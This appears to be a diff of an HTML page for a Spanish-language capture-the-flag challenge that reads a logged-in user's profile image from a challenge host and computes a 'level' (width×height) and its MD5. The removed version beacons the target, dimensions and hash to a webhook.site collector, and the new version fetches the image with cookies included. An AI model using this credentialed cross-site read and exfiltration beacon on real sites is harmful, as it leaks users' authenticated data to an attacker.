@@ -1,45 +1,72 @@
 <!doctype html>
 <html lang="es">
-<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CTF Viewer</title></head>
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Demo lab: obtener tamaño imagen cooperativo</title>
+</head>
 <body>
-  <h3>CTF: obtener nivel</h3>
-  <label>Target (protocol+host): <input id="domain" value="https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar" /></label>
-  <label>Path (ej: /profile-pic): <input id="path" value="/profile-pic" /></label>
-  <label>Collector (ej: https://webhook.site/ID): <input id="collector" value="https://webhook.site/YOUR-ID" /></label>
-  <button id="go">Cargar</button>
-  <div id="out"></div>
+  <h1>Demo cooperativa: obtener tamaño y MD5 del nivel</h1>
+  <p>Haz click para intentar obtener la imagen desde p1 (solo funciona si p1 permite CORS y credenciales).</p>
+  <button id="run">Pedir imagen y calcular nivel</button>
 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js"></script>
+  <div id="result" style="margin-top:1em"></div>
+
+  <!-- MD5 desde CDN (blueimp-md5) - uso educativo en laboratorio controlado -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js"
+    integrity="sha512-6pQZfV+7wKk1gZ0bLq6cLfi0u7v2x9nJw6kKq5dB5qYq8Qf1X+v8zQ3x5k9Y6c4x5m3h0tLz8g3Jwq2YwqQ=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
   <script>
-    document.getElementById('go').onclick = function() {
-      const domain = document.getElementById('domain').value.replace(/\/+$/,'');
-      const path = document.getElementById('path').value;
-      const collector = document.getElementById('collector').value;
-      const target = domain + (path.startsWith('/') ? path : '/' + path) + '?_cb=' + Date.now();
+    const P1_URL = 'https://p1.ejemplo.com/profile-pic'; // reemplazar por tu p1
 
-      const img = new Image();
-      img.src = target;
-      img.crossOrigin = "use-credentials"; // NO asegura lectura si servidor no permite CORS
-      img.onload = function() {
-        const w = img.naturalWidth, h = img.naturalHeight;
-        const level = w * h;
-        const md5level = md5(String(level));
-        document.getElementById('out').innerText = `w=${w} h=${h} level=${level} md5=${md5level}`;
-        if (collector) {
-          // beacon por GET (imagen) para evitar bloqueos CORS en el collector
-          const u = new URL(collector);
-          u.searchParams.set('t', new Date().toISOString());
-          u.searchParams.set('target', target);
-          u.searchParams.set('w', w);
-          u.searchParams.set('h', h);
-          u.searchParams.set('level', level);
-          u.searchParams.set('md5', md5level);
-          new Image().src = u.toString();
+    document.getElementById('run').addEventListener('click', async () => {
+      const out = document.getElementById('result');
+      out.textContent = 'Solicitando imagen...';
+
+      try {
+        // Petición que envía cookies si p1 permite credentials
+        const resp = await fetch(P1_URL, {
+          method: 'GET',
+          credentials: 'include' // envía cookies (solo si p1 y cookie lo permiten)
+        });
+
+        if (!resp.ok) {
+          out.textContent = `Error al obtener la imagen: ${resp.status}`;
+          return;
         }
-      };
-      img.onerror = function(e){ document.getElementById('out').innerText = 'Error cargando imagen (403/404/CSP?)'; };
-      document.body.appendChild(img); // opcional: mostrar imagen
-    };
+
+        // Obtener blob y crear un objeto URL para asignar a Image
+        const blob = await resp.blob();
+        const url = URL.createObjectURL(blob);
+
+        const img = new Image();
+        img.onload = () => {
+          const width = img.naturalWidth;
+          const height = img.naturalHeight;
+          const level = width * height;
+          const md5hash = md5(String(level)); // usa la librería cargada desde CDN
+
+          out.innerHTML =
+            `<p>Dimensiones: ${width} × ${height} px</p>
+             <p>Nivel: ${level}</p>
+             <p>MD5(nivel): <code>${md5hash}</code></p>
+             <p><img src="${url}" alt="imagen recibida" style="max-width:300px; display:block; margin-top:8px"></p>`;
+
+          URL.revokeObjectURL(url);
+        };
+
+        img.onerror = () => {
+          out.textContent = 'No se pudo cargar la imagen (posible problema de CORS o blob).';
+          URL.revokeObjectURL(url);
+        };
+
+        img.src = url;
+
+      } catch (err) {
+        out.textContent = 'Error en la operación: ' + err;
+      }
+    });
   </script>
 </body>
 </html>
